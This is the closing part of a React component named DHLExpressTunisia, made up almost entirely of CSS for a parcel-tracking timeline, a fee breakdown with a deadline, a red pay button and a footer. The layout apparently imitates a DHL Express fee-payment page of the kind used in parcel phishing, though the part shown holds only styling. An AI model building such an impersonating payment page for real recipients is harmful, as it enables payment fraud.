        .portal-lang-btn {
          display: flex;
          align-items: center;
          gap: 6px;
          padding: 6px 12px;
          background: rgba(255,255,255,0.1);
          border: 1px solid rgba(255,255,255,0.15);
          border-radius: 8px;
          color: inherit;
          font-size: 0.82rem;
          font-weight: 500;
          cursor: pointer;
          font-family: inherit;
          transition: all 0.15s;
        }

        .portal-lang-btn:hover {
          background: rgba(255,255,255,0.18);
        }

        .portal-lang-menu {
          position: absolute;
          top: calc(100% + 6px);
          right: 0;
          background: #fff;
          border-radius: 10px;
          box-shadow: 0 8px 32px rgba(0,0,0,0.18);
          min-width: 180px;
          overflow: hidden;
          z-index: 200;
          border: 1px solid #e2e8f0;
        }

        .portal-lang-menu a:hover {
          background: #f1f5f9;
        }

        /* Main Content */
        .main-content-container {
          min-height: 100vh;
          padding-top: 90px;
        }

        .content-wrapper {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          margin-top: var(--dui-size-space-5x);
        }

        .live-region {
          position: absolute;
          width: 1px;
          height: 1px;
          padding: 0;
          margin: -1px;
          overflow: hidden;
          white-space: nowrap;
          border: 0;
          clip: rect(0px,0px,0px,0px);
          clip-path: inset(50%);
        }

        .main-card {
          display: flex;
          flex-direction: column;
          min-width: 850px;
          max-width: 850px;
          margin-bottom: 235px;
        }

        .card-inner {
          display: flex;
          flex-direction: column;
          column-gap: 15px;
        }

        /* Timeline Styles */
        .timeline-section {
          margin-bottom: 28px;
          padding: 20px 0 10px;
          overflow-x: auto;
        }

        .timeline {
          display: flex;
          align-items: flex-start;
          justify-content: center;
          min-width: 500px;
        }

        .tl-step {
          display: flex;
          flex-direction: column;
          align-items: center;
          width: 70px;
          flex-shrink: 0;
          opacity: 0;
          animation: tl-fade-in 0.4s ease forwards;
        }

        .tl-step:nth-child(1) { animation-delay: 0.1s; }
        .tl-step:nth-child(3) { animation-delay: 0.3s; }
        .tl-step:nth-child(5) { animation-delay: 0.5s; }
        .tl-step:nth-child(7) { animation-delay: 0.7s; }
        .tl-step:nth-child(9) { animation-delay: 0.9s; }
        .tl-step:nth-child(11) { animation-delay: 1.1s; }

        .tl-icon {
          width: 32px;
          height: 32px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 14px;
          font-weight: bold;
          color: #fff;
          position: relative;
          z-index: 1;
        }

        .tl-step.done .tl-icon {
          background: #4caf50;
        }

        .tl-step.current .tl-icon {
          background: #ffb300;
          width: 38px;
          height: 38px;
          font-size: 16px;
          box-shadow: 0 0 0 4px rgba(255,179,0,0.25);
        }

        .tl-step.pending .tl-icon {
          background: #ddd;
        }

        .tl-label {
          font-size: 11px;
          color: #333;
          margin-top: 6px;
          text-align: center;
          font-weight: 600;
          line-height: 1.2;
        }

        .tl-step.pending .tl-label {
          color: #aaa;
        }

        .tl-step.current .tl-label {
          color: #e65100;
          font-weight: 700;
        }

        .tl-date {
          font-size: 10px;
          color: #888;
          margin-top: 2px;
          text-align: center;
        }

        .tl-step.current .tl-date {
          color: #e65100;
          font-weight: 600;
        }

        .tl-line {
          flex: 1;
          height: 3px;
          margin-top: 16px;
          min-width: 20px;
          opacity: 0;
          animation: tl-fade-in 0.4s ease forwards;
        }

        .tl-line:nth-child(2) { animation-delay: 0.2s; }
        .tl-line:nth-child(4) { animation-delay: 0.4s; }
        .tl-line:nth-child(6) { animation-delay: 0.6s; }
        .tl-line:nth-child(8) { animation-delay: 0.8s; }
        .tl-line:nth-child(10) { animation-delay: 1.0s; }

        .tl-line.done {
          background: #4caf50;
        }

        .tl-line.active {
          background: linear-gradient(90deg, #4caf50, #ffb300);
        }

        .tl-line.pending {
          background: #ddd;
        }

        .tl-pulse {
          display: block;
          width: 12px;
          height: 12px;
          background: #fff;
          border-radius: 50%;
          animation: pulse-ring 1.5s ease-in-out infinite;
        }

        @keyframes pulse-ring {
          0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.7); }
          70% { box-shadow: 0 0 0 8px rgba(255,255,255,0); }
          100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); }
        }

        @keyframes tl-fade-in {
          to { opacity: 1; }
        }

        /* Landing Content Styles */
        .landing-content {
          padding: 0;
          font-family: Delivery, Verdana, sans-serif;
          color: #333;
          line-height: 1.65;
        }

        .landing-header {
          text-align: center;
          margin-bottom: 24px;
        }

        .landing-header h2 {
          font-size: 24px;
          color: #333;
          margin: 0 0 6px;
        }

        .landing-sub {
          font-size: 15px;
          color: #888;
          margin: 0 0 16px;
        }

        .landing-ref-box {
          display: inline-flex;
          flex-direction: column;
          align-items: center;
          background: #f5f5f5;
          border-radius: 6px;
          padding: 10px 24px;
        }

        .landing-ref-label {
          font-size: 11px;
          color: #888;
          text-transform: uppercase;
          letter-spacing: 1px;
        }

        .landing-ref-value {
          font-size: 15px;
          font-weight: 700;
          color: #333;
          letter-spacing: 0.5px;
        }

        .landing-body {
          margin-bottom: 24px;
        }

        .landing-body p {
          margin: 0 0 12px;
          font-size: 14.5px;
          color: #444;
        }

        .landing-payment {
          margin-bottom: 20px;
        }

        .landing-payment-box {
          background: #fafafa;
          border: 1px solid #e5e5e5;
          border-radius: 8px;
          padding: 20px 24px;
          margin-bottom: 16px;
        }

        .landing-fee-row {
          display: flex;
          justify-content: space-between;
          padding: 6px 0;
          font-size: 14px;
          color: #555;
        }

        .landing-fee-divider {
          border-top: 1px solid #ddd;
          margin: 8px 0;
        }

        .landing-fee-total {
          display: flex;
          justify-content: space-between;
          padding: 6px 0;
          font-size: 18px;
          font-weight: 700;
          color: #333;
        }

        .landing-deadline {
          text-align: center;
          font-size: 13px;
          color: #888;
          margin-top: 12px;
        }

        .landing-pay-btn {
          display: block;
          width: 100%;
          padding: 15px;
          background: #d40511;
          color: #fff !important;
          font-size: 17px;
          font-weight: 700;
          text-align: center;
          text-decoration: none;
          border: none;
          border-radius: 6px;
          cursor: pointer;
          box-sizing: border-box;
          transition: background 0.2s, transform 0.1s;
        }

        .landing-pay-btn:hover {
          background: #b00410;
          transform: translateY(-1px);
        }

        .landing-pay-btn:active {
          transform: translateY(0);
        }

        .landing-secure-note {
          text-align: center;
          font-size: 12px;
          color: #999;
          margin-top: 10px;
        }

        /* Footer Styles */
        .footer-container {
          padding: 30px 0px;
          background: var(--dui-colors-background-secondary);
          color: var(--color-layout-footer-text);
          min-width: 460px;
        }

        .footer-inner {
          max-width: 1190px;
          padding: 0px 40px;
          margin: 0px auto;
          box-sizing: border-box;
        }

        .footer-table {
          border-width: 0;
          border-collapse: collapse;
          width: 100%;
        }

        .footer-body-row {
          border-top: 1px solid rgb(170,170,170);
          border-bottom: 1px solid rgb(170,170,170);
        }

        .footer-cell-main {
          border-width: 0;
          display: flex;
          padding: 15px;
          border-right: 1px solid #aaa;
          vertical-align: middle;
          gap: 10px;
          align-items: center;
        }

        .footer-link {
          color: var(--color-form-label);
          text-decoration: none;
          cursor: pointer;
          font-size: var(--font-size-body-xs);
        }

        .footer-links-group {
          grid-area: set2;
          justify-self: end;
        }

        .consent-link {
          color: inherit !important;
          border: unset !important;
          height: unset !important;
          white-space: unset !important;
          overflow-wrap: unset !important;
          padding: unset !important;
          font-size: 12px !important;
          line-height: unset !important;
          transition: unset !important;
        }

        .consent-link:hover {
          color: inherit !important;
          background: none !important;
        }

        .footer-cell-logo {
          border-width: 0;
          padding: 8px;
          color: var(--color-form-label);
          gap: 30px;
          width: 30%;
          vertical-align: middle;
        }

        .footer-logo {
          color: transparent;
          width: 128px;
          height: auto;
        }

        .copyright {
          grid-area: copyright;
          color: var(--color-form-label);
          font-size: var(--font-size-body-xs);
          margin-top: 6px;
          margin-left: 10px;
        }

        /* Responsive Styles */
        @media (max-width: 1200px) {
          .header-content, .footer-inner {
            padding: 0px 20px;
          }
          .logo-container {
            gap: 25px;
          }
          .lang-container {
            font-size: 14px;
            flex-direction: column;
            gap: 0px;
          }
          .main-content-container {
            padding-top: 150px;
          }
        }

        @media (max-width: 850px) {
          .main-card {
            min-width: 100%;
            max-width: 100%;
          }
        }

        @media (max-width: 768px) {
          .main-card {
            min-width: unset !important;
            max-width: 100% !important;
            width: auto !important;
            margin: 10px !important;
            padding: 20px !important;
          }
          .footer-container {
            min-width: unset !important;
          }
          .top-bar {
            position: relative !important;
          }
          .timeline-section {
            display: none !important;
          }
          .footer-cell-main {
            flex-direction: column !important;
            border: none !important;
            text-align: center !important;
          }
          .footer-cell-logo {
            text-align: center !important;
          }
          .footer-links-group {
            justify-self: start;
          }
        }

        @media (max-width: 512px) {
          .main-content-container {
            min-height: unset;
            padding-top: 55px;
          }
          .content-wrapper {
            margin-top: 40px !important;
          }
          .main-card {
            padding-left: var(--dui-size-space-10x) !important;
            padding-right: var(--dui-size-space-10x) !important;
            margin-bottom: var(--dui-size-space-20x) !important;
            max-width: 100% !important;
            min-width: 100% !important;
          }
          .footer-container {
            min-width: unset !important;
            max-width: 100% !important;
            width: auto !important;
          }
          .footer-cell-main {
            flex-direction: column;
            justify-content: flex-start;
          }
        }

        @media (max-width: 480px) {
          #langName {
            display: none;
          }
          .portal-lang-btn {
            padding: 6px 8px;
          }
        }
      `}</style>
    </div>
  );
};

export default DHLExpressTunisia;